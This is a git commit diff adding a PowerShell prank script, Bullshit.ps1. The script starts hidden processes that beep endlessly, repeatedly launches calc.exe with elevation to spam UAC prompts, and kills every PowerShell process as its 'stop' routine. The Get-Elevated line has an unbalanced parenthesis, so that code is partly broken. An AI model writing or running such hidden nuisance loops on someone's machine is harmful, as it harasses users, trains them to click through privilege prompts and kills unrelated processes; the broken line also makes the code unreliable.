ba30dea227b522a599e54358e17ac4a2584bdb96
EOLFML <166341840+EOLFML@users.noreply.github.com>
2024-04-08 01:29:20 +0200

    Update Bullshit.ps1

--- Bullshit.ps1
+++ Bullshit.ps1
@@ -1,1 +1,13 @@
-write-output 'hello'
+#### Full Bullshit ####
+
+function Get-Beep {
+    Start-Process powershell -WindowStyle Hidden -ArgumentList 'while(1){[System.Console]::Beep(1000,1000)}'
+}
+
+function Get-Elevated {
+    Start-Process powershell -WindowStyle Hidden -ArgumentList 'while(1){sleep(get-random(30);start-process -Verb runas calc.exe}'
+}
+
+function Stop-bullshit {
+    Get-process powershell | Stop-process
+}
